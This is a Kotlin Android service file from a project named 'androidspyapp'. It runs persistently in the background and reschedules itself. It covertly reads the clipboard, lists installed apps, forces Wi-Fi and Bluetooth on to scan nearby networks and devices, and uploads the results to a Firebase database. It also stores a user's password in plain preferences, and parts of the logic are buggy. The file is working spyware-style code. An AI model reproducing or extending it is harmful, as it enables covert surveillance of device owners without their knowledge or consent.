package com.komnacki.androidspyapp

import android.app.AlarmManager
import android.app.PendingIntent
import android.app.Service
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.net.wifi.WifiManager
import android.os.IBinder
import android.util.Log
import com.google.firebase.database.FirebaseDatabase
import com.komnacki.androidspyapp.receivers.BluetoothScanReceiver
import com.komnacki.androidspyapp.receivers.WifiScanReceiver
import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
import io.reactivex.rxjava3.core.Observable
import io.reactivex.rxjava3.disposables.Disposable
import io.reactivex.rxjava3.schedulers.Schedulers
import kotlin.system.exitProcess


class MainService : Service() {
    private lateinit var userEmail: String
    private lateinit var userPassword: String

    private var disposable: Disposable? = null
    private var clipboardManager: ClipboardManager? = null
    private val wifiScanResults: MutableList<WifiScanResult> = mutableListOf()
    private val bluetoothScanResults: MutableList<BluetoothScanResult> = mutableListOf()
    private lateinit var bluetoothAdapter: BluetoothAdapter
    private lateinit var mWifiScanReceiver: WifiScanReceiver
    private lateinit var mBluetoothScanReceiver: BluetoothScanReceiver

    override fun onCreate() {
        super.onCreate()
        Thread.setDefaultUncaughtExceptionHandler { t, e ->
            exitProcess(1)
        }

        val prefs = getSharedPreferences(MainActivity.SHARED_PREFERENCE_TAG, Context.MODE_PRIVATE)
        val prefsUserEmail = prefs.getString(MainActivity.PREFS_USER_EMAIL, null)
        val prefsUserPassword = prefs.getString(MainActivity.PREFS_USER_PASSWORD, null)
        if (!prefsUserEmail.isNullOrBlank() && !prefsUserPassword.isNullOrBlank()) {
            userEmail = prefsUserEmail
            userPassword = prefsUserPassword
            FirebaseDatabase.getInstance().reference.child(userEmail).keepSynced(true)
            bluetoothAdapter = BluetoothAdapter.getDefaultAdapter()
        }
    }


    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        doWork()
        return START_STICKY
    }

    override fun stopService(name: Intent?): Boolean {
        dispose(disposable)
        return super.stopService(name)
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun doWork() {
        val installedApps = mutableListOf<String>()
        val systemApps = mutableListOf<String>()

        val flags: Int = PackageManager.GET_META_DATA or
                PackageManager.GET_SHARED_LIBRARY_FILES or
                PackageManager.GET_UNINSTALLED_PACKAGES

        val pm: PackageManager = packageManager
        val applications: List<ApplicationInfo> = pm.getInstalledApplications(flags)
        for (appInfo in applications) {
            if (appInfo.flags and ApplicationInfo.FLAG_SYSTEM === 1) {
                systemApps.add(appInfo.toString())
            } else {
                installedApps.add(appInfo.toString())
            }
        }

        if (disposable == null || disposable!!.isDisposed) {
            disposable = Observable.just(1)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe({ action ->


                    val serviceReceiverIntent =
                        Intent(applicationContext, ServiceReceiver::class.java)
                    serviceReceiverIntent.action = Intent.ACTION_DEFAULT

                    val pendingIntent = PendingIntent.getBroadcast(
                        applicationContext,
                        1,
                        serviceReceiverIntent,
                        PendingIntent.FLAG_ONE_SHOT
                    )

                    val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
                    val nextAlarmTime = getNextAlarmTime()
                    val prefs = getSharedPreferences(
                        MainActivity.SHARED_PREFERENCE_TAG,
                        Context.MODE_PRIVATE
                    )
                    val editor = prefs.edit()
                    alarmManager.set(AlarmManager.ELAPSED_REALTIME, nextAlarmTime, pendingIntent)
                    editor.putLong(MainActivity.PREFS_SERVICE_NEXT_ALARM, nextAlarmTime)
                    editor.apply()

                    getClipboard()
                    scanWifiNetwork()
                    scanBluetoothNetwork()

                    writeNew()
                }, { t ->
                    Log.e("ERROR: ", t.toString())
                })
        }
    }

    private fun getClipboard() {
        try {
            clipboardManager =
                applicationContext.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            clipboardManager!!.primaryClip!!.getItemAt(0)

        } catch (e: Exception) {
            Log.e("ERROR: ", e.message + ", " + e.cause)
        }
    }

    private fun scanBluetoothNetwork() {
        mBluetoothScanReceiver = BluetoothScanReceiver { items -> bluetoothScanResults.addAll(items) }

        bluetoothAdapter.let {adapter ->
            if (!adapter.isEnabled) {
                mBluetoothScanReceiver.state = MessageUtils.StateChange.CHANGE_TO_ENABLED
                adapter.enable()
            }
            if (adapter.isEnabled) {
                registerReceiver(mBluetoothScanReceiver, IntentFilter(BluetoothDevice.ACTION_FOUND))
                bluetoothAdapter.startDiscovery()
            }
        }
    }

    private fun scanWifiNetwork() {
        val mWifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager

        if (!mWifiManager.isWifiEnabled) {
            mWifiScanReceiver = WifiScanReceiver(mWifiManager) { items -> wifiScanResults.addAll(items) }
            mWifiScanReceiver.state = MessageUtils.StateChange.CHANGE_TO_ENABLED
            mWifiManager.isWifiEnabled = true
        }

        if (mWifiManager.isWifiEnabled) {
            registerReceiver(
                mWifiScanReceiver,
                IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)
            )
            registerReceiver(
                mWifiScanReceiver,
                IntentFilter(WifiManager.EXTRA_WIFI_STATE)
            )
        }
    }

    private fun getNextAlarmTime() = System.currentTimeMillis()

    private fun writeNew() {
        val messageUtils = MessageUtils.getInstance(this, userEmail)
        messageUtils.sendData(
            bluetoothAdapter.name,
            wifiScanResults,
            bluetoothScanResults
        )
    }

    private fun dispose(disposable: Disposable?) {
        if (disposable != null) {
            if (!disposable.isDisposed) {
                disposable.dispose()
            }
        }
    }
}